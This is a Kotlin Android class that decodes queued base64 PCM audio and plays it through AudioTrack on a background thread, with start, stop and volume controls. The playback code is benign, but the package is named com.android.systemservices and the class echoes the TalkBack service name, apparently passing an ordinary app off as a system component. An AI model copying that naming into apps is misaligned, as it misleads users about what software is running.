package com.android.systemservices

import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioTrack
import android.util.Base64
import android.util.Log
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

class TalkbackHelper {

    companion object {
        private const val TAG = "TalkbackHelper"
    }

    @Volatile var active = false
    private var track: AudioTrack? = null
    private var thread: Thread? = null
    private var trackSampleRate = 0
    private val queue = LinkedBlockingQueue<Pair<ByteArray, Int>>()

    // Called with the first chunk's sample rate; rebuilds AudioTrack if rate changed.
    private fun ensureTrack(sampleRate: Int) {
        if (track != null && trackSampleRate == sampleRate) return
        track?.let { try { it.stop() } catch (_: Exception) {}; try { it.release() } catch (_: Exception) {} }
        val minBuf = AudioTrack.getMinBufferSize(
            sampleRate, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT
        )
        if (minBuf <= 0) { Log.e(TAG, "AudioTrack unsupported at ${sampleRate}Hz"); return }
        val at = try {
            AudioTrack.Builder()
                .setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_MEDIA)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                        .build()
                )
                .setAudioFormat(
                    AudioFormat.Builder()
                        .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                        .setSampleRate(sampleRate)
                        .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                        .build()
                )
                .setBufferSizeInBytes(maxOf(minBuf * 4, 8192))
                .setTransferMode(AudioTrack.MODE_STREAM)
                .build()
        } catch (e: Exception) {
            Log.e(TAG, "AudioTrack init failed at ${sampleRate}Hz: ${e.message}")
            return
        }
        track = at
        trackSampleRate = sampleRate
        at.play()
        Log.i(TAG, "AudioTrack ready at ${sampleRate}Hz")
    }

    fun start() {
        if (active) return
        active = true
        queue.clear()
        thread = Thread {
            while (active) {
                try {
                    val (bytes, sr) = queue.poll(500, TimeUnit.MILLISECONDS) ?: continue
                    ensureTrack(sr)
                    track?.write(bytes, 0, bytes.size)
                } catch (_: InterruptedException) { break }
                catch (e: Exception) { Log.e(TAG, "write error: ${e.message}") }
            }
        }.also {
            it.isDaemon = true
            it.name = "Talkback"
            it.start()
        }
        Log.i(TAG, "Talkback started")
    }

    fun enqueue(base64: String, sampleRate: Int = 44100) {
        if (!active) return
        try {
            queue.offer(Base64.decode(base64, Base64.NO_WRAP) to sampleRate)
        } catch (e: Exception) { Log.e(TAG, "enqueue: ${e.message}") }
    }

    fun setVolume(level: Float) {
        track?.setVolume(level.coerceIn(0f, 1f))
    }

    fun stop() {
        if (!active) return
        active = false
        queue.clear()
        thread?.interrupt()
        thread = null
        try { track?.stop()    } catch (_: Exception) {}
        try { track?.release() } catch (_: Exception) {}
        track = null
        trackSampleRate = 0
        Log.i(TAG, "Talkback stopped")
    }
}
